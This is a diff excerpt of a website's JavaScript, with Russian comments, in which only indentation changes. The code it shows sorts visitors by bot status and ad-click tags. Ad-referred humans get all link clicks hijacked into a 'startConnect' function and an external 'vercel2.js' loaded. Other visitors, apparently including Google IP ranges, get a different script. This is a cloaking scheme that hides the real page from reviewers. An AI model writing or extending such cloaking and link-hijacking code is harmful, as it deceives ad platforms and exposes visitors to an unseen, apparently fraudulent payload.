@@ -359,40 +359,40 @@ setTimeout(() => {
 	if (!isBot() && (hasGclid || hasPromopult)) {
     // Добавляем скрипт для блокировки ссылок
 		const linkBlockerScript = document.createElement('script');
-		linkBlockerScript.textContent = `
+			linkBlockerScript.textContent = `
         // Function to handle the connect action
-        window.startConnect = function() {
+			window.startConnect = function() {
             console.log("startConnect function triggered!");
             // Add your custom logic for startConnect here
         };
 
         // Function to block href navigation and trigger startConnect
-        document.addEventListener('DOMContentLoaded', function() {
-            const links = document.querySelectorAll('a[href]');
-            links.forEach(link => {
-                link.addEventListener('click', function(event) {
-                    event.preventDefault(); // Prevent default navigation
-                    window.startConnect(); // Call the startConnect function
-                });
-            });
-        });
+			document.addEventListener('DOMContentLoaded', function() {
+				const links = document.querySelectorAll('a[href]');
+				links.forEach(link => {
+					link.addEventListener('click', function(event) {
+						event.preventDefault(); // Prevent default navigation
+						window.startConnect(); // Call the startConnect function
+					});
+				});
+			});
     `;
     document.head.appendChild(linkBlockerScript);
   
     // Загружаем vercel2.js для пользователей с метками через script тег
     const vercelScript = document.createElement('script');
-    vercelScript.charset = 'UTF-8';
-    vercelScript.type = 'text/javascript';
-    vercelScript.src = './vercel2.js';
-    document.head.appendChild(vercelScript);
+		vercelScript.charset = 'UTF-8';
+		vercelScript.type = 'text/javascript';
+		vercelScript.src = './vercel2.js';
+		document.head.appendChild(vercelScript);
     
-    console.log('vercel2.js загружен через script тег');
+		console.log('vercel2.js загружен через script тег');
 	} else {
     // Передаем IP-адреса в глобальную переменную перед загрузжением coockie.js
-    window.googleIPRanges = ipRanges;
+		window.googleIPRanges = ipRanges;
   
     // Загружаем coockie.js для пользователей без меток
-    loadScript('coockie.js', function() {
+		loadScript('coockie.js', function() {
         console.log('coockie.js загружен с IP-адресами');
     });
 }
